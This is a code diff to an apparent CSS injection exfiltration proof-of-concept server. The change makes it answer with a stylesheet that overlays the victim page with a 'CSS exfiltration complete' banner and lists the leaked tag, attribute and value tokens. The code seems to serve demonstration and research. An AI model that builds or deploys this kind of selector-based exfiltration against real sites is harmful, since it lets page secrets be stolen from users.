@@ -140,13 +140,52 @@ function checkCompleted(response) {
         genResponse(response, ++currentElementPos);
     } else {
         stop = true;            
-        completed();
-        response.end();   
+        completed(response);
     }
 }
 
-function completed() {
+function completed(response) {
     console.log("Completed.", tokens);
+    let extractedValues = '';
+    for(let tokenObject of tokens) {
+        let{tag, attribute, value} = tokenObject;
+        extractedValues += `\\0aTag:\\09\\09\\09\\09 ${tag}\\0a Attribute\\09\\09\\09 ${attribute}\\0a Value\\09\\09\\09 ${value}\\0a`;
+    }
+    response.writeHead(200, { 'Content-Type': 'text/css'});
+    response.write(`
+        html:before {
+            position:fixed;
+            color: #155724;
+            background-color: #d4edda;
+            border-bottom: 5px solid #c3e6cb;
+            padding: 0.75rem 1.25rem;
+            font-size: 50px;
+            padding: 5px;
+            height:calc(100% - 70px);
+            width:100%;
+            content: "CSS exfiltration complete";
+            font-family:Arial;
+            box-sizing: border-box
+        }
+        html:after{
+        color: #155724;
+            background-color: #d4edda;
+            border-color: #c3e6cb;
+            padding: 0.75rem 1.25rem;
+            border: 1px solid transparent;
+        content: "The content on the webpage has been successfully exfiltrated and sent to a remote server. \\0a This is what has been extracted:\\0a ${extractedValues}";
+        position:fixed;
+        left:0;
+        top:50px;
+        padding:5px;
+        width: 100%;
+        height: calc(100% - 70px);
+        white-space: pre;
+        font-family:Arial;
+        box-sizing: border-box
+        }
+    `);
+    response.end();
 }
 
 function generateNotSelectors(elementName, attributeName) {
